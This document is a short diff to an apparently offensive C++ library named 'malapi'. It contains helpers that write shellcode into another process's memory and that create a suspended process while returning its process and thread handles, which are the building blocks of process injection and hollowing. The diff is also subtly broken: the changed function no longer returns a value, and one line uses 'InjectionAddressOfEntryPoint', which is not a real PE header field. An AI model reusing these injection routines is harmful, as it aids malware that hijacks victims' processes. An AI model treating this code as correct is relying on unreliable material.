@@ -178,6 +178,7 @@ namespace malapi
 
 	//
 	// Uses VirtualAllocExNuma, VirtualProtectEx and WriteProcessMemory to write shellcode into memory
+	// Returns Base Address Handle on Success
 	// Returns NULL on failure.
 	//
 	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
@@ -962,9 +963,9 @@ namespace malapi
 
 	//
 	// Create Suspended Process
-	// Return ProcessHandle
+	// Return Process Handle & Thread Handle
 	//
-	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path)
+	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle)
 	{
 		STARTUPINFOA si = {};
 		PROCESS_INFORMATION pi = {};
@@ -992,8 +993,8 @@ namespace malapi
 
 		if (!success) return NULL;
 
-		CloseHandleC(pi.hThread);
-		return pi.hProcess;
+		*process_handle = pi.hProcess;
+		*thread_handle = pi.hThread;
 	}
 
 	//
@@ -1100,7 +1101,7 @@ namespace malapi
 #else
 		nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)headers_buffer + dos_header->e_lfanew);
 #endif
-		code_entry = (LPVOID)(nt_headers->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)image_base);
+		code_entry = (LPVOID)(nt_headers->OptionalHeader.InjectionAddressOfEntryPoint + (DWORD_PTR)image_base);
 
 */
 
